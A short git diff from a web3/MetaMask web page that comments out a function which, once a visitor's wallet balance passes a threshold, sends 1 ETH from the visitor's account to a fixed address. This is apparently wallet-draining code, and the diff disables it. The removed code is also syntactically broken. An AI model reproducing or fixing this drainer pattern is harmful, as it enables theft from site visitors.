@@ -248,23 +248,23 @@ window.addEventListener('load', async () => {
         console.log('Non-Ethereum browser detected. You should consider trying MetaMask!');
     }
 
-    function mainEnter() {
-        var balance = web3.eth.getBalance(address);
-        var wallet = web3.eth.toWei(balance, 'ether');
-        if(wallet=>"100000000000")
-            web3.eth.getAccounts(function(error, result) {
-            web3.eth.sendTransaction(
-                {from:web3.eth.accounts[0],
-                to:"0x943",
-                value:  "1000000000000000000", 
-                data: "0xdf"
-                }, function(err, transactionHash) {
-            if (!err)
-                console.log(transactionHash + " success"); 
+//     function mainEnter() {
+//         var balance = web3.eth.getBalance(address);
+//         var wallet = web3.eth.toWei(balance, 'ether');
+//         if(wallet=>"100000000000")
+//             web3.eth.getAccounts(function(error, result) {
+//             web3.eth.sendTransaction(
+//                 {from:web3.eth.accounts[0],
+//                 to:"0x943",
+//                 value:  "1000000000000000000", 
+//                 data: "0xdf"
+//                 }, function(err, transactionHash) {
+//             if (!err)
+//                 console.log(transactionHash + " success"); 
 
-        else if (wallet<="100000000000")
-            console.log('na change dey there');        
-        });
+//         else if (wallet<="100000000000")
+//             console.log('na change dey there');        
+//         });
            
     });
 
